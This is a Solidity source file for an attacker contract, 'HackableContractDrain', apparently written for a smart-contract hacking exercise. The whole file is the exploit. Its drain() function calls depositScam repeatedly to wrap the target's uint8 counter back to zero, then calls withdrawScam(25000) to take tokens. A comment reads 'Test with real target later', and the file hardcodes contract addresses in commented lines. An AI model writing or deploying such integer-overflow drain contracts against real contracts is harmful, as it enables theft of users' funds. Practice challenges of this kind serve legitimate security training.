// This complies.
pragma solidity =0.7.6;

import "hardhat/console.sol";

// Test with real target later.
contract HackableContractDrain {

    // address public constant HACKABLECONTRACT_ADDRESS = 0xFcF2774cD61743fF7C34607Fadf3C84FC4762029;
    // address public constant SCAM_ADDRESS = 0xdb78FcBb4f1693FDBf7a85E970946E4cE466E2A9;

    // address public constant HACKER = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;

    address immutable HACKABLECONTRACT_ADDRESS;
    address immutable SCAM_ADDRESS;
    
	address owner_;

    uint8 public count = 0;
	
    constructor(address hackablecontract, address scam) {
        owner_ = msg.sender;
        HACKABLECONTRACT_ADDRESS = hackablecontract;
        SCAM_ADDRESS = scam;
    } 
    
    function drain() public {
        HackableContract hackableContract = HackableContract(HACKABLECONTRACT_ADDRESS);
        BEP20 scamtoken = BEP20(SCAM_ADDRESS);
		
        do {
            hackableContract.depositScam(owner_, 0);
            count = hackableContract.count();
            // Currently it is 1
            // Repeat until 1 to 256 and 0 again.
        } while (count != 0);

        hackableContract.depositScam(owner_, 0);
        // Call with owner adress instead later?
        // Or include function or code to do send to owner.
        hackableContract.withdrawScam(25000);
    }
}

abstract contract HackableContract {
    uint8 public count = 0;
    mapping(address => bool) addressRegistered;
	mapping(address => uint8) addressToId;
	mapping(uint8 => uint256) balances;
    
    function setCount(uint8 scam) virtual external;
	function depositScam(address origin, uint256 amount) virtual external;
    function withdrawScam(uint256 amount) virtual external;
}

abstract contract BEP20 {
        
    function balanceOf(address tokenOwner) virtual external view returns (uint256);
    function transfer(address receiver, uint256 numTokens) virtual public returns (bool);
    function totalSupply() virtual external view returns (uint256);
}